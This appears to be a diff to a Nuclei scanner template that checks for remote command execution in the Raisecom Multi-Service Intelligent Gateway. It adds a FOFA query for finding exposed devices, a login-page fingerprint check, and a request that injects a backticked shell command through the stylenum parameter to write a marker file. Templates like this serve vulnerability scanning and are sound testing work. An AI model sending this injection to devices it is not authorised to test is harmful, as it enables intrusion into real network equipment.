@@ -1,20 +1,40 @@
 id: raisecom-rce
 
 info:
-  name: Remote Command Execution in Raisecom Multi-Service Intelligent Gateway
+  name: Raisecom Multi-Service Intelligent Gateway - Remote Command Execution
   author: 3th1c_yuk1
   severity: critical
   description: |
     Remote Command Execution (RCE) vulnerability in Raisecom Multi-Service Intelligent Gateway's `vpn_template_style.php`
   reference:
     - https://github.com/koishi0x01/CVE/blob/main/CVE_1.md
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: '"<TITLE>Web user login</TITLE>" && "<META content\==MSHTML 6.00.2900.5583\" name\=GENERATOR></HEAD>"'
   tags: raisecom,rce,intrusive
 
 variables:
   string: "{{randstr}}"
   filename: "{{to_lower(rand_text_alpha(5))}}"
 
+flow: http(1) && http(2)
+
 http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<TITLE>Web user login"
+          - 'status_code == 200'
+        condition: and
+        internal: true
+
   - raw:
       - |
         GET /vpn/vpn_template_style.php?mySubmit=true&stylenum=%60echo+-e+%27{{string}}%27%3E/www/tmp/{{filename}}.txt%60 HTTP/1.1
